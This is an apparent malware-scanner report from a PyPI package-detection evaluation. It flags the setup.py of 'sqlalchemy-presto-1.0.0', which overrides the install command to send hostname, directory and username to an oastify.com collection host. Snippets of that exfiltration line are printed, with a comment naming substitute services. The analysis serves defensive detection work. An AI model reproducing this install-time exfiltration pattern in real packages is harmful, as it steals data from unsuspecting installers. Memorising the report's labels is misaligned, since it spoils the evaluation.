{
  "package_name": "sqlalchemy-presto-1.0.0",
  "total_matches": 3,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/sqlalchemy-presto-1.0.0/sqlalchemy-presto-1.0.0/setup.py",
      "file_name": "setup.py",
      "detection_count": 3,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "This code is malicious. It abuses the Python package installation process by defining a CustomInstall class that overrides the install command in setuptools. During installation, it collects sensitive information from the victim's system, including the hostname, current working directory, and username, without user consent or notification. It then exfiltrates this data via an HTTP GET request to a suspicious, hardcoded external domain (jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com), which is commonly used for out-of-band data collection and attacker-controlled monitoring. This pattern is a hallmark of supply chain attacks and credential-stealing malware, and is never observed in benign software. The code is not obfuscated, but the behavior is clearly malicious due to the unauthorized data collection and exfiltration during package installation.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "18",
          "type_description": "cmd-overwrite: found 1 source code matches",
          "code_snippet": "setup(name='sqlalchemy-presto', #package name\nversion='1.0.0',\ndescription='test',\nauthor='test',\nlicense='MIT',\nzip_safe=False,\ncmdclass={'install': CustomInstall})",
          "full_match": "* This package is overwriting the 'install' command in setup.py at sqlalchemy-presto-1.0.0/setup.py:18",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/sqlalchemy-presto-1.0.0/sqlalchemy-presto-1.0.0/setup.py",
          "relative_path": "sqlalchemy-presto-1.0.0/setup.py"
        },
        {
          "line_number": "15",
          "type_description": "shady-links: found 1 source code matches",
          "code_snippet": "requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at sqlalchemy-presto-1.0.0/setup.py:15",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/sqlalchemy-presto-1.0.0/sqlalchemy-presto-1.0.0/setup.py",
          "relative_path": "sqlalchemy-presto-1.0.0/setup.py"
        },
        {
          "line_number": "15",
          "type_description": "exfiltrate-sensitive-data: found 1 source code matches",
          "code_snippet": "requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream",
          "full_match": "* This package is exfiltrating sensitive data to a remote server at sqlalchemy-presto-1.0.0/setup.py:15",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/sqlalchemy-presto-1.0.0/sqlalchemy-presto-1.0.0/setup.py",
          "relative_path": "sqlalchemy-presto-1.0.0/setup.py"
        }
      ]
    }
  ]
}